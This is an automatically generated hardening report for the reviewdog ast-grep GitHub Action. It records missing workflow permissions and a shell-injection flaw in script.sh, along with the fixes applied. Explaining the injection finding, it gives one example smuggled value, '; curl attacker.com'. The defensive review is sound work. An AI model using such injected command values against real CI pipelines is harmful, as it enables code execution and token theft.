<!-- markdownlint-disable -->

# Hardening Report: reviewdog--action-ast-grep/v1.62.3

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **reviewdog--action-ast-grep/v1.62.3** was hardened automatically. 2 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### missing-permissions (severity: medium)

None of the workflow files define a `permissions:` key at the top level or at the job level. Without explicit permissions, workflows run with the default (potentially broad) token permissions. All five workflow files are affected: depup.yml, labels.yml, release.yml, reviewdog.yml, and test.yml.

Locations:

- `.github/workflows/depup.yml:1`
- `.github/workflows/labels.yml:1`
- `.github/workflows/release.yml:1`
- `.github/workflows/reviewdog.yml:1`
- `.github/workflows/test.yml:1`

### script-injection (severity: high)

Rule (b) violation: In script.sh (invoked by action.yml's composite run step), two user-controlled input variables are expanded unquoted in shell commands, allowing shell metacharacter injection. (1) `${INPUT_SG_FLAGS}` (sourced from `inputs.sg_flags`) is used unquoted on line ~52: `  ${INPUT_SG_FLAGS} |` — an attacker-supplied value like `; curl attacker.com` would be interpreted by the shell. (2) `${INPUT_REVIEWDOG_FLAGS}` (sourced from `inputs.reviewdog_flags`) is used unquoted on line ~62: `    ${INPUT_REVIEWDOG_FLAGS} |` — same risk. The `# shellcheck disable=SC2086` comment confirms intentional word-splitting, but this does not mitigate the injection risk. These should use quoted forms or an array-based approach.

Locations:

- `script.sh:52`
- `script.sh:62`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, missing-permissions

**Notes:**

Fixed script injection in script.sh by replacing unquoted ${INPUT_SG_FLAGS} and ${INPUT_REVIEWDOG_FLAGS} expansions with safe bash array tokenization using xargs (quote-aware splitting). Added minimal permissions blocks to all 5 workflow files: depup.yml (contents:write, pull-requests:write), labels.yml (issues:write), release.yml (contents:write, pull-requests:write), reviewdog.yml (contents:read, checks:write, pull-requests:write), and test.yml (contents:read, checks:write, pull-requests:write).

